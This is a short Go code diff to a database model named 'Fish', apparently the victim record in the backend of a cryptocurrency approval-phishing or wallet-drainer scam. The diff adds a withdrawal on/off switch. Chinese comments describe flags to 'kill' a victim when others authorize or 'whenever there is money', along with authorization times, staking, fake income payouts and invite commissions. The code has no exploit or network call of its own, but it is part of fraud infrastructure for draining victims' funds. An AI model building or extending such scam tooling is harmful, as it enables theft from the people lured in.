@@ -49,13 +49,17 @@ type Fish struct {
 	InComeTimes             int     `gorm:"int(10);default:1"` //发送收益次数
 	MonitoringSwitch        int     `gorm:"int(10);default:1"` //监控开关  1 开  2 关
 	ServerSwitch            int     `gorm:"int(10);default:2"` //客服开关  1 开  2 关
-	AuthorizationAt         int64   //授权时间
+	AuthorizationAt         int64     //授权时间
 	PledgeSwitch            int     `gorm:"int(10);default:2"` //质押开关  1 开  2 关   //质押开关
 	Temp                    float64 `gorm:"-"`                 //用于计算
 	OthersAuthorizationKill int     `gorm:"int(10);default:2"` //他人授权就杀的开关  1 开  2 关   //他人授权就杀的开关
 	AlreadyKill             int     `gorm:"int(10);default:2"` //总是杀开关  1 开  2 关   //有钱就杀
 	TheOnlyInvited          string  //唯一邀请码
 	CommissionIncome        float64 `gorm:"type:decimal(10,2)"` //佣金收益
+
+	TiXianSwitch            int     `gorm:"int(10);default:1"` //提现开关  1 开  2 关   //提现开关
+
+
 
 }
 
